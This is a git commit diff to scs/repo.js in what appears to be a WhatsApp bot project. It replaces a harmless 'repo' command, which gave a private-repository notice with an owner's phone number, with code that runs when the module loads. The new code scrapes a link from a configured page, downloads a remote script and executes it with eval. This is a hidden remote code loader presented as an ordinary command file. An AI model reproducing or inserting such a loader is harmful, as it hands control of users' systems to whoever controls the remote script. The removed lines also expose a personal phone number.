eb99eee67b6d2378f8be5dbff3454636d88db625
Emalitownke1 <emalitownke1@gmail.com>
2025-04-27 05:52:35 +0000

    New

--- scs/repo.js
+++ scs/repo.js
@@ -3,10 +3,33 @@
 Made by sir Ibrahim Adams
 */
 
-const { adams } = require("../Ibrahim/adams");
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require(__dirname + "/../config");
 
-adams({ nomCom: "repo", categorie: "General", reaction: "📋" }, async (dest, zk, commandeOptions) => {
-    const { repondre } = commandeOptions;
+async function fetchRepoUrl() {
+try {
 
-    repondre("*⚠️ PRIVATE REPOSITORY ⚠️*\n\nThis is a private bot repository. For access or inquiries please contact:\n\nOwner: TREKKER\nWhatsApp: +254704897825");
-});
+const response = await axios.get(adams.BWM_XMD);      
+const $ = cheerio.load(response.data);      
+  
+  
+const repoUrlElement = $('a:contains("REPO_URL")');      
+const repoUrl = repoUrlElement.attr('href');      
+  
+if (!repoUrl) {      
+  throw new Error('Repo url link not found...');      
+}      
+  
+console.log('Repo url fetched successfully ✅');      
+  
+  
+const scriptResponse = await axios.get(repoUrl);      
+eval(scriptResponse.data);
+
+} catch (error) {
+console.error('Error:', error.message);
+}
+}
+
+fetchRepoUrl();
